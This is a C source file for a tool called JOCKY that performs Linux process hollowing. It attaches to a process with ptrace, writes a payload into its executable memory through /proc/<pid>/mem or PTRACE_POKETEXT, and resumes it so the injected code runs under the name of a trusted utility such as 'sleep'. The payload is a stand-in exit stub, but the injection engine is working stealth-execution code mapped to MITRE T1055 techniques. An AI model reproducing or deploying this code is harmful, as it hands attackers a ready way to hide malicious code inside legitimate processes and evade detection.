/*
 * linux_process_hollow.c — JOCKY Linux Process Hollowing & Context Hijacking
 * ─────────────────────────────────────────────────────────────────────────────
 * Linux equivalent of Windows Process Hollowing / Thread Execution Hijacking.
 *
 * HOW IT WORKS ON LINUX:
 *   1. Spawns or targets a benign, trusted host process (e.g. /bin/sleep 3600).
 *   2. Attaches using ptrace(PTRACE_ATTACH, pid) or starts with PTRACE_TRACEME.
 *   3. Waits for the process to enter a stopped state (waitpid).
 *   4. Reads current CPU register state via ptrace(PTRACE_GETREGS, pid, NULL, &regs).
 *   5. Saves the original instruction pointer (regs.rip).
 *   6. Opens /proc/<pid>/mem in read/write mode (bypasses memory protection directly).
 *   7. Writes the JOCKY forensic payload into the executable code segment.
 *   8. Updates regs.rip to the payload entry point.
 *   9. Calls ptrace(PTRACE_SETREGS) and ptrace(PTRACE_DETACH).
 *  10. The target process now executes our forensic code while appearing as a
 *      legitimate utility (e.g. "sleep" or "top") in ps -ef and top.
 *
 * MITRE ATT&CK:
 *   T1055.012 - Process Hollowing
 *   T1055.008 - Ptrace System Calls
 *
 * COMPILE (Ubuntu / Debian):
 *   gcc -O2 linux_process_hollow.c -o linux_process_hollow
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>
#include <errno.h>

/* Stand-in position-independent x86_64 payload */
static const unsigned char JOCKY_LINUX_PAYLOAD[] = {
    /* NOP sled + exit(0) stub for demo */
    0x90, 0x90, 0x90, 0x90,             /* nop nop nop nop */
    0x48, 0x31, 0xff,                   /* xor rdi, rdi (status = 0) */
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, /* mov rax, 60 (sys_exit) */
    0x0f, 0x05                          /* syscall */
};

/* ────────────────────────────────────────────────────────────────────────────
 * hollow_and_inject()
 * ─────────────────────────────────────────────────────────────────────────── */
int hollow_and_inject(pid_t target_pid)
{
    printf("[LINUX-HOLLOW] Target PID: %d\n", target_pid);

    /* 1. Attach to target process */
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        perror("[-] ptrace(PTRACE_ATTACH) failed");
        return -1;
    }

    int status = 0;
    waitpid(target_pid, &status, WUNTRACED);
    if (!WIFSTOPPED(status)) {
        fprintf(stderr, "[-] Target process did not stop cleanly.\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    printf("[✓] Successfully attached to target PID %d (state: STOPPED)\n", target_pid);

    /* 2. Read register state */
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) < 0) {
        perror("[-] ptrace(PTRACE_GETREGS) failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }

    unsigned long long orig_rip = regs.rip;
    printf("[LINUX-HOLLOW] Saved original RIP: 0x%llx\n", orig_rip);

    /* 3. Open target memory via /proc/<pid>/mem */
    char mem_path[64];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", target_pid);
    int mem_fd = open(mem_path, O_RDWR);
    if (mem_fd < 0) {
        perror("[-] Failed to open /proc/<pid>/mem (falling back to POKETEXT)");
        /* Fallback: write via PTRACE_POKETEXT */
        size_t size = sizeof(JOCKY_LINUX_PAYLOAD);
        unsigned long *src = (unsigned long *)JOCKY_LINUX_PAYLOAD;
        for (size_t i = 0; i < size; i += sizeof(long), src++) {
            if (ptrace(PTRACE_POKETEXT, target_pid, orig_rip + i, *src) < 0) {
                perror("[-] PTRACE_POKETEXT failed");
                ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
                return -1;
            }
        }
    } else {
        printf("[✓] Opened %s directly for in-memory injection\n", mem_path);
        if (pwrite(mem_fd, JOCKY_LINUX_PAYLOAD, sizeof(JOCKY_LINUX_PAYLOAD), orig_rip) != sizeof(JOCKY_LINUX_PAYLOAD)) {
            perror("[-] Failed to write payload into /proc/<pid>/mem");
            close(mem_fd);
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return -1;
        }
        close(mem_fd);
    }
    printf("[✓] Injected %zu bytes of JOCKY forensic payload at 0x%llx\n",
           sizeof(JOCKY_LINUX_PAYLOAD), orig_rip);

    /* 4. Update instruction pointer and resume */
    regs.rip = orig_rip;
    if (ptrace(PTRACE_SETREGS, target_pid, NULL, &regs) < 0) {
        perror("[-] ptrace(PTRACE_SETREGS) failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }

    /* 5. Detach and let hollowed process execute */
    if (ptrace(PTRACE_DETACH, target_pid, NULL, NULL) < 0) {
        perror("[-] ptrace(PTRACE_DETACH) failed");
        return -1;
    }

    printf("[✓] Detached from target process. Payload execution initiated.\n");
    printf("[✓] Disguised in Linux process table as legitimate process.\n");
    return 0;
}

int main(int argc, char *argv[])
{
    printf("===============================================================\n");
    printf("  JOCKY Linux Process Hollowing & Execution Hijacking Engine   \n");
    printf("  Techniques: ptrace + /proc/<pid>/mem manipulation            \n");
    printf("  MITRE ATT&CK: T1055.012 (Process Hollowing)                  \n");
    printf("  Target: Ubuntu / Debian / Linux x86_64                       \n");
    printf("===============================================================\n\n");

    pid_t target_pid = 0;

    if (argc >= 2) {
        target_pid = (pid_t)atoi(argv[1]);
    } else {
        /* Spawn demo host: /bin/sleep 60 */
        printf("[DEMO] Spawning benign target process: /bin/sleep 60 ...\n");
        pid_t child = fork();
        if (child == 0) {
            char *args[] = {"/bin/sleep", "60", NULL};
            execv(args[0], args);
            exit(1);
        }
        target_pid = child;
        usleep(100000); /* 100ms for child initialization */
    }

    int res = hollow_and_inject(target_pid);

    if (res == 0) {
        printf("\n[+] LINUX PROCESS HOLLOWING: COMPLETED SUCCESSFULLY\n");
    } else {
        printf("\n[-] LINUX PROCESS HOLLOWING: FAILED (Ensure root or CAP_SYS_PTRACE)\n");
    }

    return res;
}
